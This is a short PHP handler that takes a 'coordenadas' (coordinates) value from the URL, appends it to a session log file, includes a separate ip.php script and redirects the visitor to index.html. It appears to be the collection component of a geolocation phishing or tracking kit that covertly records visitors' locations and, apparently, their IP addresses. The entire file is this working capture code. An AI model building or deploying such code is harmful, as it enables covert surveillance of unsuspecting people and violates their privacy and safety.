<?php
$miu = $_GET["coordenadas"];
file_put_contents("sesion.txt", "[+] Coordenadas: $miu" . PHP_EOL, FILE_APPEND);
include 'ip.php';
header('Location: index.html');
?>

